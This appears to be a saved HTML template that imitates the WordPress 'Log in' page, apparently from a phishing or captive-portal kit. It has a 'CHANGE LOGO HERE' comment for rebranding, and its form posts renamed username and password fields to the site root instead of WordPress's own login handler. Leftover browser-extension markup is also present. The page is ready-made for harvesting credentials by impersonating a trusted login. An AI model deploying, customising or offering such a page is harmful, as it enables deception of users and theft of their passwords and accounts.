<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
        <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>WordPress | Log in</title>
        <link rel="stylesheet" id="buttons-css" href="wordpress_files/buttons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="open-sans-css" href="wordpress_files/css" type="text/css" media="all">
<link rel="stylesheet" id="dashicons-css" href="wordpress_files/dashicons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="login-css" href="wordpress_files/login.min.css" type="text/css" media="all">
<meta name="robots" content="noindex,follow">
         </head>
        <body class="login login-action-login wp-core-ui  locale-en">
        <div id="login">



<!-------------------------------------------- CHANGE LOGO HERE ---------------------------->
        <center><img src="wordpress_files/wordpresslogo.png" width="100"></center>





        <form name="loginform" id="loginform" action="/" method="post">
        <p>
                <label for="user_login">Username<br>
                <input type="text" name="username" id="user_login" class="input" value="" size="20"></label>
        </p>
        <p>
                <label for="user_pass">Password<br>
                <input type="password" name="password" id="user_pass" class="input" value="" size="20"></label>
        </p>
                <p class="forgetmenot"><label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"> Remember Me</label></p>
        <p class="submit">
                <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In">
        </p>
</form>


        </div>


                <div class="clear"></div>


        </body><div id="abineFillElement"></div><div class="abineContentPanel" style="background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial; background-color: transparent !important; margin: 0px !important; padding: 0px !important; opacity: 1 !important; z-index: 2147483647 !important; position: absolute !important; overflow: hidden !important; border-width: 0px !important; visibility: visible !important; display: none;"><iframe class="abineContentFrame" width="450px" allowtransparency="true" frameborder="0" height="0px" scrolling="no" src="wordpress_files/panel.html" id="abine2758469doNotRemove" style="position:relative !important;display:block !important;background:transparent !important;border-width:0px !important;left:0px !important;top:0px !important;visibility:visible !important;opacity:1 !important;filter:alpha(opacity:100) !important;margin:0 !important;padding:0 !important;height:0px !important;width:450px"></iframe></div></html>
